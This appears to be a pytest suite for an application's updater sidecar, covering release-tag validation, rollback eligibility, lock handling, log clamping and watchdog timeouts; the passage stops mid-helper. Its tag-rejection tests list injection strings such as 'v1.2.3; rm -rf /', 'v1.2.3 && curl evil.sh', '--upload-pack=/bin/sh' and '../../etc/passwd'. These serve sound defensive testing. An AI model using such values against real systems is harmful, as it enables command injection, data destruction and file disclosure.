"""The updater's decisions, tested without Docker.

Everything here is a pure function on purpose. The alternative — a bash
supervisor calling `python3 -c` for JSON — would put tag validation, the
security-critical part, outside any test the suite can run.
"""
import os
import subprocess

import pytest
from pathlib import Path

from app.ops.version import parse_version
from updater.supervisor import (
    MIN_ROLLBACK_TAG,
    REWRITTEN_SSH_HOST,
    _REMOTE_RECHECK_SECONDS,
    clamp_log_tail,
    eligible_rollback_targets,
    is_stale_lock,
    looks_like_ssh_url,
    parse_deployed_tags,
    redact_userinfo,
    remote_failure_reason,
    should_recheck_remote,
    step_for_line,
    url_host,
    validate_tag,
)


# ── Tag validation ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("tag", ["v1.0.0", "v0.0.1", "v10.20.30", "v1.2.3", "v0.0.0", "v0.9.9"])
def test_valid_tags_accepted(tag):
    assert validate_tag(tag) is True


@pytest.mark.parametrize("tag", [
    "--upload-pack=/bin/sh",     # git argument injection
    "v1.2.3; rm -rf /",          # shell metacharacters
    "v1.2.3 && curl evil.sh",
    "$(whoami)",
    "`id`",
    "../../etc/passwd",          # path traversal
    "../v1.0.0",
    "v1.2.3-rc1",                # prereleases are deliberately not deployable
    "V1.2.3",                    # wrong case
    "1.2.3",                     # missing the v
    "v1.2",                      # not three components
    "v1.2.3.4",
    "latest",
    "",
    "   ",
    None,
    "v01.0.0",                   # leading zero: same distinct-ref/same-tuple
    "v1.00.0",                   # collision class as the homoglyph case
    "v1.0.00",
])
def test_hostile_and_malformed_tags_rejected(tag):
    assert validate_tag(tag) is False


def test_validation_rejects_embedded_newline():
    """A newline would let a second line reach a log or a file write intact."""
    assert validate_tag("v1.0.0\nv2.0.0") is False


def test_validation_rejects_a_trailing_newline():
    """Python's `$` also matches just before a trailing newline, so a regex
    anchored with `$` accepts "v1.0.0\n". The anchor must be `\\Z`."""
    assert validate_tag("v1.0.0\n") is False


def test_validation_rejects_unicode_digits():
    """`\\d` is Unicode-aware in Python, so it accepts Arabic-Indic digits.
    "v١.٠.٠" is a DIFFERENT git ref that parse_version() reads as the same
    (1, 0, 0) tuple as "v1.0.0" — a homoglyph collision in the one function
    whose job is to pin an exact release."""
    assert validate_tag("v١.٠.٠") is False


@pytest.mark.parametrize("tag", [b"v1.0.0", 1.0, 100, ["v1.0.0"], {"tag": "v1.0.0"}, True])
def test_non_string_tags_rejected_without_raising(tag):
    """The tag arrives from JSON written by another process, so a non-str is a
    real possibility. re.match would raise TypeError rather than return False."""
    assert validate_tag(tag) is False


# ── .deployed parsing and rollback eligibility ───────────────────────────────

def test_parse_deployed_extracts_tags_in_order():
    text = (
        "2026-07-26T18:54:28Z v1.0.0\n"
        "2026-07-27T09:00:00Z v1.1.0\n"
        "2026-07-27T10:00:00Z v1.0.0\n"
    )
    assert parse_deployed_tags(text) == ["v1.0.0", "v1.1.0", "v1.0.0"]


def test_parse_deployed_ignores_junk_lines():
    assert parse_deployed_tags("\ngarbage\n2026-07-26T18:54:28Z v1.0.0\n") == ["v1.0.0"]


def _rel_to_floor(major_delta=0, minor_delta=0, patch_delta=0) -> str:
    """A release tag positioned relative to MIN_ROLLBACK_TAG.

    These tests used to hardcode v1.0.0/v1.1.0/v1.2.0 around a floor that
    happened to be v1.1.0. That made them assertions about *the constant's
    current value* rather than about the rule — so they kept passing when the
    floor turned out to name a release that never shipped /control, which is the
    exact failure mode Task 10 warns about. Deriving the fixtures from the floor
    means these exercise the behaviour at whatever the floor is.
    """
    major, minor, patch, _ = parse_version(MIN_ROLLBACK_TAG)
    return f"v{major + major_delta}.{minor + minor_delta}.{patch + patch_delta}"


def test_eligible_targets_excludes_the_running_tag():
    at_floor = MIN_ROLLBACK_TAG
    above = _rel_to_floor(minor_delta=1)
    lines = f"t {at_floor}\nt {above}\n"
    assert eligible_rollback_targets(lines, current_tag=above) == [at_floor]


def test_eligible_targets_refuses_below_the_updater_floor():
    """Rolling back past the release that introduced the updater checks out a
    compose file with no /control mount, so the app returns unable to submit
    OR read requests. That is a one-way door back to SSH, not a degraded mode."""
    below = _rel_to_floor(minor_delta=-1)
    at_floor = MIN_ROLLBACK_TAG
    above = _rel_to_floor(minor_delta=1)
    lines = f"t {below}\nt {at_floor}\nt {above}\n"
    targets = eligible_rollback_targets(lines, current_tag=above)
    assert below not in targets
    assert targets == [at_floor]


def test_this_tree_actually_ships_the_control_mount():
    """The floor's premise, checked against the tree rather than trusted.

    MIN_ROLLBACK_TAG claims to name the first release that ships /control. A
    unit test cannot know the release number, but it CAN refuse to let the
    constant sit in a tree that does not ship /control at all — which is how the
    previous value (v1.1.0, a CSP/nav release) came to name a release with no
    control mount.
    """
    compose = Path("docker-compose.yml").read_text()
    assert ":/control" in compose, "MIN_ROLLBACK_TAG names a /control release, but this tree has no /control mount"


def test_min_rollback_tag_is_itself_eligible():
    lines = f"t {MIN_ROLLBACK_TAG}\nt v9.9.9\n"
    assert MIN_ROLLBACK_TAG in eligible_rollback_targets(lines, current_tag="v9.9.9")


def test_eligible_targets_are_deduped_and_version_ordered_newest_first():
    a = MIN_ROLLBACK_TAG                      # the floor itself
    b = _rel_to_floor(minor_delta=1)
    c = _rel_to_floor(minor_delta=8)          # two-digit minor: sorts by value, not string
    current = _rel_to_floor(major_delta=1)
    lines = f"t {a}\nt {c}\nt {b}\nt {a}\nt {current}\n"
    assert eligible_rollback_targets(lines, current_tag=current) == [c, b, a]


def test_eligible_targets_drops_malformed_entries():
    at_floor = MIN_ROLLBACK_TAG
    current = _rel_to_floor(minor_delta=1)
    lines = f"t {at_floor}\nt not-a-tag\nt {current}\n"
    assert eligible_rollback_targets(lines, current_tag=current) == [at_floor]


def test_eligible_targets_empty_when_only_one_release_recorded():
    """The live host is in exactly this state: .deployed holds one line."""
    assert eligible_rollback_targets("t v1.0.0\n", current_tag="v1.0.0") == []


def test_eligible_targets_excludes_releases_newer_than_the_running_one():
    """A control labelled "Roll back" must not offer to move forward. Going
    forward is what the tag field is for, and rollback.sh's own bare mode
    already means "the newest release strictly older than the running one"."""
    at_floor = MIN_ROLLBACK_TAG
    current = _rel_to_floor(minor_delta=1)
    newer = _rel_to_floor(minor_delta=2)
    lines = f"t {at_floor}\nt {current}\nt {newer}\nt {current}\n"
    assert eligible_rollback_targets(lines, current_tag=current) == [at_floor]


def test_eligible_targets_empty_when_running_the_oldest_recorded_release():
    lines = "t v1.1.0\nt v1.2.0\nt v1.1.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.1.0") == []


def test_eligible_targets_fail_closed_on_an_unparseable_current_tag():
    """Skipping the at-or-newer guard would offer releases NEWER than the
    running one. This function is also the pickup-time re-validation, so
    failing open here would let a mislabelled "roll back" actually execute."""
    lines = "t v1.1.0\nt v9.9.9\n"
    assert eligible_rollback_targets(lines, current_tag="garbage") == []
    assert eligible_rollback_targets(lines, current_tag=None) == []
    assert eligible_rollback_targets(lines, current_tag="dev") == []


def test_eligible_targets_reject_what_parse_version_would_accept():
    """parse_version is the LAXER regex — it happily parses "v1.3.0-rc1" and
    "v١.٠.٠". validate_tag must therefore run FIRST. A prerelease in .deployed
    is normal operation, not hypothetical: deploy.sh --tag v1.3.0-rc1 is the
    documented escape hatch and [3/5] records whatever it deployed."""
    at_floor = MIN_ROLLBACK_TAG
    prerelease = _rel_to_floor(minor_delta=1) + "-rc1"
    current = _rel_to_floor(minor_delta=2)
    lines = f"t {at_floor}\nt {prerelease}\nt v١.٠.٠\nt {current}\n"
    assert eligible_rollback_targets(lines, current_tag=current) == [at_floor]


# ── Lock staleness ───────────────────────────────────────────────────────────

def test_lock_held_by_a_live_recent_process_is_not_stale():
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1060.0, pid_alive=lambda p: True) is False


def test_lock_with_a_dead_pid_is_stale():
    """Without this a killed updater wedges the feature permanently, and the
    only recovery is the SSH session this whole feature exists to avoid."""
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1060.0, pid_alive=lambda p: False) is True


def test_lock_older_than_thirty_minutes_is_stale_even_if_the_pid_lives():
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1000.0 + 1801, pid_alive=lambda p: True) is True


def test_unparseable_lock_is_stale():
    assert is_stale_lock({}, now=1.0, pid_alive=lambda p: True) is True
    assert is_stale_lock(None, now=1.0, pid_alive=lambda p: True) is True


@pytest.mark.parametrize("pid", [True, False, 0, -1, "123", None, 1.5])
def test_lock_with_an_out_of_range_or_wrong_type_pid_is_stale(pid):
    """isinstance(True, int) is True since bool subclasses int, so a bare type
    check alone would accept True/False as pids. pid=0 signals the entire
    process group via os.kill and pid=-1 signals every process the caller's
    uid can reach — both would report "alive" via a real side effect rather
    than a lookup, so treating them as valid pids is unsafe even before
    considering whether the callback is well-behaved."""
    lock = {"pid": pid, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1010.0, pid_alive=lambda p: True) is True


# ── deploy.sh output → step ──────────────────────────────────────────────────

@pytest.mark.parametrize("line,step", [
    ("[0/5] preflight: external 'web' network + compose declaration", "preflight"),
    ("[1/5] Deploy v1.1.0 (checkout + pull + recreate)", "deploying"),
    ("[2/5] Health check", "awaiting-health"),
    ("→ Automatically reverting to v1.0.0", "reverting"),
    ("[3/5] Record the deploy", "finalizing"),
    ("[4/5] Startup log scan", "finalizing"),
    ("[5/5] Done", "finalizing"),
    ("[1/4] Roll back to v1.0.0", "deploying"),
    ("[4/4] Health check", "awaiting-health"),
])
def test_step_markers_recognised(line, step):
    assert step_for_line(line) == step


def test_unrecognised_output_does_not_change_the_step():
    assert step_for_line("     resolved latest release: v1.1.0") is None


def test_app_log_output_cannot_walk_progress_backwards():
    """[4/5] echoes raw `docker logs` into the same stream, so an application
    log line mentioning a marker must not be mistaken for one. Real markers are
    always at column 0."""
    assert step_for_line("2026-07-26 INFO worker [1/5] starting batch") is None
    assert step_for_line("  WARNING: Automatically reverting cache entry") is None
    assert step_for_line("[1/5] Deploy v1.1.0 (checkout + pull + recreate)") == "deploying"


# ── Log clamping ─────────────────────────────────────────────────────────────

def test_log_tail_capped_at_one_hundred_lines():
    assert len(clamp_log_tail([f"line {i}" for i in range(500)])) == 100


def test_log_tail_keeps_the_most_recent_lines():
    out = clamp_log_tail([f"line {i}" for i in range(500)])
    assert out[-1] == "line 499"


def test_log_tail_capped_at_eight_kilobytes():
    """A chatty failure must not be able to fill the control volume."""
    out = clamp_log_tail(["x" * 1000] * 100)
    assert sum(len(l.encode()) for l in out) <= 8192


def test_log_tail_never_empties_on_a_single_oversized_line():
    """A docker pull dump or a traceback arrives as ONE long line. Popping
    until it fits would leave the operator staring at nothing on the exact
    path where the log is all they have."""
    out = clamp_log_tail(["x" * 100_000])
    assert len(out) == 1
    assert sum(len(l.encode()) for l in out) <= 8192
    assert out[0].startswith("...")


def test_log_tail_truncation_keeps_the_end_not_the_beginning():
    """A traceback's exception line and a progress dump's final state are both
    at the END. Keeping the head threw away the only line that says what went
    wrong, on the exact path where the log tail is all the operator has."""
    tb = ("Traceback (most recent call last):\n"
          + '  File "x.py", line 1, in f\n' * 4000
          + "ValueError: THE ACTUAL ERROR MESSAGE\n")
    out = clamp_log_tail([tb])
    assert "ValueError: THE ACTUAL ERROR MESSAGE" in out[0]
    assert out[0].startswith("...")
    assert len(out[0].encode()) <= 8192


def test_log_tail_of_empty_input_is_empty():
    assert clamp_log_tail([]) == []


def test_log_tail_cap_counts_bytes_not_characters():
    """deploy.sh emits 3-byte UTF-8 (→ ✓ ✗ ⚠) on the auto-revert path, so a
    character-counted cap silently allowed 2x the intended size — 4x for emoji.
    The constant is named _BYTES and justified by disk space on a shared volume."""
    for filler in ("é", "🚀"):
        out = clamp_log_tail([filler * 9000])
        assert sum(len(l.encode()) for l in out) <= 8192, filler


def test_log_tail_truncation_never_splits_a_codepoint():
    """A byte slice landing mid-codepoint would produce invalid UTF-8, which the
    app's json.load would reject — turning a readable failure into no status
    at all."""
    out = clamp_log_tail(["🚀" * 9000])
    assert len(out) == 1
    out[0].encode("utf-8")            # must not raise
    assert out[0].startswith("...")


# ── Run loop (filesystem, still no Docker) ───────────────────────────────────

import json
import os

from updater.supervisor import (
    build_command,
    claim_request,
    read_json,
    seen_request,
    write_json_atomic,
)


def test_write_json_atomic_leaves_no_tmp_behind(tmp_path):
    target = tmp_path / "status.json"
    write_json_atomic(target, {"state": "running"})
    assert json.loads(target.read_text())["state"] == "running"
    assert list(tmp_path.iterdir()) == [target]


def test_write_json_atomic_overwrites_cleanly(tmp_path):
    target = tmp_path / "status.json"
    write_json_atomic(target, {"n": 1})
    write_json_atomic(target, {"n": 2})
    assert json.loads(target.read_text())["n"] == 2


def test_claim_request_renames_so_a_second_claim_finds_nothing(tmp_path):
    """Read-then-unlink races a second writer; rename() is atomic within a
    filesystem, so the loser simply has nothing to claim."""
    req = tmp_path / "request.json"
    req.write_text(json.dumps({"id": "abc", "action": "update", "tag": "v1.1.0"}))
    claimed1, first = claim_request(tmp_path)
    claimed2, second = claim_request(tmp_path)
    assert claimed1 is True
    assert first["id"] == "abc"
    assert claimed2 is False
    assert second is None
    assert not req.exists()
    assert (tmp_path / "request.json.claimed").exists()


def test_claim_request_returns_none_when_absent(tmp_path):
    assert claim_request(tmp_path) == (False, None)


def test_claim_request_returns_none_on_malformed_json(tmp_path):
    (tmp_path / "request.json").write_text("{not json")
    assert claim_request(tmp_path) == (True, None)


def test_claim_request_distinguishes_nothing_from_unusable(tmp_path):
    """Collapsing these into None consumed the operator's click silently: the
    rename had already happened, so the request was gone while the app went on
    showing the previous run's status."""
    assert claim_request(tmp_path) == (False, None)

    (tmp_path / "request.json").write_text('{"id": "abc", "action": "upda')
    assert claim_request(tmp_path) == (True, None)
    assert not (tmp_path / "request.json").exists()


def test_claim_request_rejects_a_non_dict_payload(tmp_path):
    """A JSON array reached request.get() and raised AttributeError OUTSIDE any
    try, killing the poll loop — the sidecar died until container restart."""
    (tmp_path / "request.json").write_text("[1, 2]")
    assert claim_request(tmp_path) == (True, None)


def test_replayed_request_id_is_ignored():
    seen = []
    assert seen_request("abc", seen) is False
    assert seen_request("abc", seen) is True


def test_seen_ids_are_bounded_to_fifty():
    seen = []
    for i in range(120):
        seen_request(f"id-{i}", seen)
    assert len(seen) == 50
    assert seen_request("id-119", seen) is True    # recent one still remembered
    assert seen_request("id-0", seen) is False     # oldest has aged out


def test_build_command_for_update_uses_argv_not_a_shell_string():
    cmd = build_command("update", "v1.1.0", root="/opt/vigilant")
    assert isinstance(cmd, list)
    assert cmd == ["/opt/vigilant/scripts/deploy.sh", "--tag", "v1.1.0"]


def test_build_command_for_rollback():
    cmd = build_command("rollback", "v1.1.0", root="/opt/vigilant")
    assert cmd == ["/opt/vigilant/scripts/rollback.sh", "--to", "v1.1.0"]


def test_build_command_refuses_an_unknown_action():
    with pytest.raises(ValueError):
        build_command("rm-rf", "v1.1.0", root="/opt/vigilant")


def test_read_json_returns_none_for_missing_or_broken(tmp_path):
    assert read_json(tmp_path / "nope.json") is None
    bad = tmp_path / "bad.json"
    bad.write_text("{{{")
    assert read_json(bad) is None


from updater.supervisor import _REVERT_OK_RE, _REVERT_FAILED_RE


def test_revert_tag_parsed_from_the_real_deploy_sh_wording():
    """deploy.sh:207 prints "✓ Reverted to v1.0.0; the site is serving." — the
    tag is NOT the last whitespace-separated token, and line.split()[-1] yields
    "serving.", which would render "Reverted to serving." in the UI on the
    failure path."""
    ok = _REVERT_OK_RE.match("✓ Reverted to v1.0.0; the site is serving.")
    assert ok and ok.group(1) == "v1.0.0"
    bad = _REVERT_FAILED_RE.match(
        "✗ Revert to v1.0.0 ALSO failed — manual intervention needed.")
    assert bad and bad.group(1) == "v1.0.0"


def test_revert_regexes_ignore_the_revert_start_line():
    """"→ Automatically reverting to v1.0.0" announces the START of a revert;
    treating it as the outcome would report success before it happened."""
    line = "→ Automatically reverting to v1.0.0"
    assert _REVERT_OK_RE.match(line) is None
    assert _REVERT_FAILED_RE.match(line) is None


def test_every_marker_matches_a_line_the_real_scripts_actually_print():
    """The markers are substrings of live production scripts. If someone edits
    an echo in deploy.sh, progress silently stops advancing — this fails first."""
    import re as _re
    from updater.supervisor import _STEP_MARKERS
    emitted = []
    for path in ("scripts/deploy.sh", "scripts/rollback.sh"):
        with open(path) as fh:
            src = fh.read()
        for m in _re.finditer(r'^\s*echo\s+"([^"]*)"', src, _re.M):
            emitted.append(_re.sub(r"\$\{?\w+\}?", "X", m.group(1)))
    for marker, _step in _STEP_MARKERS:
        assert any(line.startswith(marker) for line in emitted), \
            f"no line in deploy.sh/rollback.sh starts with {marker!r}"


# ── Watchdog: the wall-clock ceiling must actually fire ──────────────────────

def test_a_hang_that_keeps_printing_is_still_killed(tmp_path, monkeypatch):
    """The original design put the ceiling on wait(timeout=...), which is only
    reached after EOF — so a stalled `docker pull` that keeps printing progress
    never closed the pipe and ran forever. Reproduced before this was fixed."""
    import updater.supervisor as sup

    script = tmp_path / "chatty.sh"
    script.write_text('#!/usr/bin/env bash\nwhile true; do echo "[1/5] x"; sleep 0.05; done\n')
    script.chmod(0o755)
    monkeypatch.setattr(sup, "_RUN_TIMEOUT_SECONDS", 1)
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    monkeypatch.setattr(sup, "eligible_rollback_targets", lambda *a, **k: ["v1.1.0"])

    import time as _t
    t0 = _t.monotonic()
    sup.run_action({"id": "x", "action": "update", "tag": "v1.1.0"})
    assert _t.monotonic() - t0 < 20, "watchdog did not fire"

    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "exceeded" in status["error"]


def test_a_silent_hang_is_killed(tmp_path, monkeypatch):
    """The other hang shape: blocked with no output at all, so the blocking
    readline never returns either."""
    import updater.supervisor as sup

    script = tmp_path / "silent.sh"
    script.write_text('#!/usr/bin/env bash\necho "[1/5] Deploy"\nsleep 300\n')
    script.chmod(0o755)
    monkeypatch.setattr(sup, "_RUN_TIMEOUT_SECONDS", 1)
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    monkeypatch.setattr(sup, "eligible_rollback_targets", lambda *a, **k: ["v1.1.0"])

    import time as _t
    t0 = _t.monotonic()
    sup.run_action({"id": "y", "action": "update", "tag": "v1.1.0"})
    assert _t.monotonic() - t0 < 20, "watchdog did not fire"
    assert json.loads((tmp_path / "status.json").read_text())["state"] == "failed"


# ── Silent-drop paths must publish a refusal ──────────────────────────────────

def test_a_request_with_no_id_is_recorded_not_silently_dropped(tmp_path, monkeypatch):
    """claim_request() consumes the file, so a bare `continue` would make the
    click vanish while the app kept showing the previous run's status."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    sup._publish_refusal({"action": "update", "tag": "v1.1.0"}, "Request had no id and was refused.")
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "no id" in status["error"]


# ── Loop-body coverage (was previously untestable: run() never returns) ──────

def test_pid_alive_treats_permission_denied_as_alive():
    """os.kill(1, 0) raises PermissionError for a process we may not signal.
    The obvious `except OSError: return False` would call it dead and reclaim a
    lock still in use. This constraint had zero coverage — reverting it passed
    all 93 tests."""
    from updater.supervisor import _pid_alive
    assert _pid_alive(1) is True            # exists, not ours
    assert _pid_alive(999_999) is False     # does not exist


def test_a_tick_that_runs_an_action_advances_the_step(tmp_path, monkeypatch):
    """Nothing asserted status["step"] ever moved, so prefixing the line before
    step_for_line — which breaks startswith matching — passed the whole suite."""
    import updater.supervisor as sup
    script = tmp_path / "fake-deploy.sh"
    script.write_text(
        '#!/usr/bin/env bash\n'
        'echo "[0/5] preflight: external \'web\' network"\n'
        'echo "[2/5] Health check"\n'
        'echo "[5/5] Done"\n')
    script.chmod(0o755)
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])

    sup.run_action({"id": "s1", "action": "update", "tag": "v1.1.0"})
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "success"
    assert status["step"] == "done"


def test_rollback_eligibility_is_read_fresh_not_from_the_heartbeat(tmp_path, monkeypatch):
    """AC5's headline requirement had no test. The heartbeat's list is UX; the
    authority is a fresh read of .deployed at pickup time."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    at_floor = MIN_ROLLBACK_TAG
    mid = _rel_to_floor(minor_delta=1)
    newest = _rel_to_floor(minor_delta=2)
    (tmp_path / ".deployed").write_text(f"t {at_floor}\nt {mid}\nt {newest}\n")
    sup.write_heartbeat({"socket": "ok"})
    assert at_floor in json.loads((tmp_path / "updater.json").read_text())["targets"]

    # .deployed changes underneath — the cached heartbeat is now stale.
    (tmp_path / ".deployed").write_text(f"t {newest}\n")
    monkeypatch.setattr(sup, "build_command",
                        lambda a, t, root=None: ["/bin/false"])
    sup.run_action({"id": "r1", "action": "rollback", "tag": at_floor})
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "not an eligible rollback target" in status["error"]


def test_tick_survives_a_request_that_would_have_killed_the_loop(tmp_path, monkeypatch):
    """A JSON array used to reach request.get() and raise AttributeError outside
    any try, exiting run() and taking the feature down until container restart."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    (tmp_path / "request.json").write_text("[1, 2]")
    sup._tick([], tmp_path / "update.lock")      # must not raise
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "unreadable" in status["error"]


# ── Orphaned status reconciliation (a killed sidecar must not lie forever) ───

def test_an_orphaned_running_status_is_closed_out_on_restart(tmp_path, monkeypatch):
    """A SIGKILLed or OOM-killed sidecar leaves status.json saying "running"
    with nobody left to finish it, and the panel spins forever."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    (tmp_path / "status.json").write_text(json.dumps({
        "id": "abc", "action": "update", "state": "running", "step": "deploying",
        "to_tag": "v1.1.0", "error": None, "finished_at": None}))
    sup._reconcile_orphaned_status()
    st = json.loads((tmp_path / "status.json").read_text())
    assert st["state"] == "failed"
    assert st["finished_at"]
    assert "outcome is unknown" in st["error"]


def test_reconcile_leaves_a_finished_status_alone(tmp_path, monkeypatch):
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    (tmp_path / "status.json").write_text(json.dumps({"state": "success", "step": "done"}))
    sup._reconcile_orphaned_status()
    assert json.loads((tmp_path / "status.json").read_text())["state"] == "success"


# ── Auto-revert, end to end ───────────────────────────────────────────────────

def _fake_deploy(tmp_path, name, body):
    s = tmp_path / name
    s.write_text("#!/usr/bin/env bash\n" + body)
    s.chmod(0o755)
    return s


def test_auto_revert_is_reported_end_to_end(tmp_path, monkeypatch):
    """deploy.sh's own auto-revert path, from raw output to status.json."""
    import updater.supervisor as sup
    script = _fake_deploy(tmp_path, "d.sh",
        'echo "[1/5] Deploy v1.1.0 (checkout + pull + recreate)"\n'
        'echo "[2/5] Health check"\n'
        'echo "→ Automatically reverting to v1.0.0"\n'
        'echo "✓ Reverted to v1.0.0; the site is serving."\n'
        'exit 1\n')
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    sup.run_action({"id": "r", "action": "update", "tag": "v1.1.0"})
    st = json.loads((tmp_path / "status.json").read_text())
    assert st["state"] == "failed"
    assert st["reverted_to"] == "v1.0.0"      # NOT "serving."


def test_a_failed_revert_is_reported_as_needing_a_human(tmp_path, monkeypatch):
    """Deploy failed AND its revert failed — nothing automatic is left."""
    import updater.supervisor as sup
    script = _fake_deploy(tmp_path, "d.sh",
        'echo "[2/5] Health check"\n'
        'echo "→ Automatically reverting to v1.0.0"\n'
        'echo "✗ Revert to v1.0.0 ALSO failed — manual intervention needed."\n'
        'exit 1\n')
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    sup.run_action({"id": "r2", "action": "update", "tag": "v1.1.0"})
    st = json.loads((tmp_path / "status.json").read_text())
    assert st["state"] == "failed"
    assert st["reverted_to"] is None
    assert "Manual intervention required" in st["message"]


# ── Stale lock: removed, not just logged ─────────────────────────────────────

def test_a_stale_lock_is_removed_not_just_logged(tmp_path, monkeypatch):
    """It was logged as "reclaiming" on every tick while staying on disk —
    ~86,400 identical warnings a day, and the message was not even true."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    lock = tmp_path / "update.lock"
    lock.write_text(json.dumps({"pid": 999_999, "started_at": 1.0}))
    sup._tick([], lock)
    assert not lock.exists()


# ── Status schema defined once ────────────────────────────────────────────────

def test_status_schema_has_exactly_the_keys_the_app_expects(tmp_path, monkeypatch):
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    expected = {"id", "action", "state", "step", "from_tag", "to_tag", "message",
                "error", "reverted_to", "log_tail", "started_at", "finished_at"}
    assert set(sup._new_status()) == expected
    sup._publish_refusal({"id": "x"}, "nope")
    assert set(json.loads((tmp_path / "status.json").read_text())) == expected


# ── Self-checks key set is part of the app-facing contract ───────────────────

def test_self_checks_key_set(monkeypatch, tmp_path):
    import updater.supervisor as sup

    def fake_run(argv, **kwargs):
        # A real CompletedProcess, not `lambda *a, **k: None`. _remote_check
        # reads .returncode and .stderr off the result, so a None-returning
        # wildcard stub would silently exercise its EXCEPTION path — the key set
        # would still come out right, for entirely the wrong reason, and the
        # test would keep passing if the success path stopped working.
        return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

    monkeypatch.setattr(sup.subprocess, "run", fake_run)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    (tmp_path / ".deployed").write_text("2026-01-01T00:00:00Z v1.2.0\n")
    checks = sup._self_checks()
    assert set(checks) == {"socket", "git", "compose", "remote", "deployed", "tmp"}
    assert checks["remote"] == "ok"
    assert checks["tmp"] == "ok"


# ── The `tmp` check: added after a /tmp permissions bug passed every check ───
# that existed before it ───────────────────────────────────────────────────
#
# A sidecar built with the wrong tmpfs `mode` (see docker-compose.yml's
# `updater:` tmpfs comment for the full story) started cleanly, published
# `socket`, `git`, `remote`, `compose` and `deployed` as all `ok`, and then
# failed its first update in seconds with nothing but `mktemp: Permission
# denied` in the log — none of the existing checks writes a file. Both tests
# below use real filesystem behaviour, no mocks: the whole point of this check
# is that it exercises the actual primitive, and a mock of "was mkdtemp
# called" would prove nothing about whether the real one can succeed.

def test_tmp_check_ok():
    import updater.supervisor as sup
    assert sup._tmp_check() == "ok"


def test_tmp_check_reports_a_readable_reason_when_the_directory_is_unusable(
        tmp_path, monkeypatch):
    """TMPDIR pointed at a path whose parent does not exist — real behaviour,
    no mocks. `_tmp_check()` resolves the directory as `${TMPDIR:-/tmp}` and
    passes it to mkdtemp EXPLICITLY (see the function's docstring for why:
    the no-argument form silently tries other candidates and could mask
    exactly this failure), so setting TMPDIR is enough to steer it without
    needing to break the real /tmp on the machine running the suite."""
    import updater.supervisor as sup
    bad = tmp_path / "does-not-exist" / "child"
    monkeypatch.setenv("TMPDIR", str(bad))

    result = sup._tmp_check()

    assert result.startswith("FAIL: ")
    # Names the directory it actually tried, not a generic message — the
    # whole reason self-checks exist is to name what to go fix.
    assert str(bad) in result
    assert "scripts/deploy.sh" in result
    assert "scripts/rollback.sh" in result


# ── The `remote` check: can this container actually fetch from origin ────────
#
# The check that did not exist when the first real in-app update failed. The old
# `git` check ran `git rev-parse HEAD` — purely local — so a sidecar with no ssh
# client, no key and an SSH origin reported four green checks and an enabled
# button, and the click died on
# `error: cannot run ssh: No such file or directory`.
#
# Everything below runs offline. The success case uses a real local bare
# repository as origin, the failure case a path that does not exist, and the
# SSH-origin case is tested against the classifier as a pure function on
# strings — shelling out to a real SSH host would need the network, and on a
# developer machine (which HAS an ssh binary, unlike the image) it would behave
# differently than in CI.


@pytest.fixture
def git_env(monkeypatch):
    """Neutralise the developer's own git configuration for these tests.

    A contributor who pushes over SSH commonly has a global
    `url.*.insteadOf` rule, and macOS ships an osxkeychain credential helper.
    Either one changes what these assertions see relative to CI. _git_env()
    builds on os.environ, so setting these here reaches the subprocess.
    """
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", os.devnull)


def _git(*args, cwd=None):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


def _bare_origin(tmp_path):
    """A real, non-empty bare repository usable as an offline `origin`."""
    work = tmp_path / "work"
    _git("init", "-q", "-b", "main", str(work))
    (work / "README").write_text("x\n")
    _git("-C", str(work), "add", "README")
    _git("-C", str(work), "-c", "user.email=t@example.invalid",
         "-c", "user.name=t", "commit", "-qm", "init")
    bare = tmp_path / "origin.git"
    _git("clone", "--bare", "-q", str(work), str(bare))
    return bare


def _clone_with_origin(tmp_path, url):
    repo = tmp_path / "clone"
    _git("init", "-q", "-b", "main", str(repo))
